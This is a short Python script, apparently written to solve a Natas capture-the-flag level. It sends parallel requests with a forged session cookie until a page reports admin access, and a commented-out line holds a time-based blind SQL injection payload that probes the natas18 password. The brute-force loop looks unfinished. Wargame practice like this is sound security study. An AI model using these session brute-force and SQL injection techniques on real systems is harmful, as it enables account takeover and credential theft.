#!/usr/bin/python

import requests
from multiprocessing.dummy import Pool 

def req(q):
    r = requests.get('http://example/index.php', auth=('basic-user', 'passwd'), cookies={'PHPSESSID':'blabla'})
    #payload={'username': 'natas18" AND password LIKE BINARY \''+password+i+'%\' AND SLEEP(3)  #'}
    #r = requests.post('http://example/index.php?debug=debug', data=payload)
                      
    if 'You are an admin' in r.content:
         print r.content 
         print q
         pool.terminate()

pool = Pool(8)
results = pool.map_async(req, range(641))
pool.close()
pool.join()
